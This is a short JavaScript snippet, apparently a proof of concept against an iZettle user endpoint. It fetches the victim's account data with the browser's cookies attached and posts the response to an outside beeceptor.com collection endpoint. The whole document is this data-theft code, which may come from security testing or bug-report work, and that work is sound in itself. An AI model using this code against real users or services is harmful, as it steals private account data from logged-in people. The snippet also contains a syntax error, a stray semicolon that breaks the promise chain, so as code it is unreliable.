fetch('https://secure.izettle.com/api/resources/user', {
    method: 'get',
    credentials: 'include',
    headers: {
    'Content-Type': 'application/json'
    }
}).then(response => response.text());
.then(data => {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://moblig.free.beeceptor.com/data');
    xhr.send(data);
});
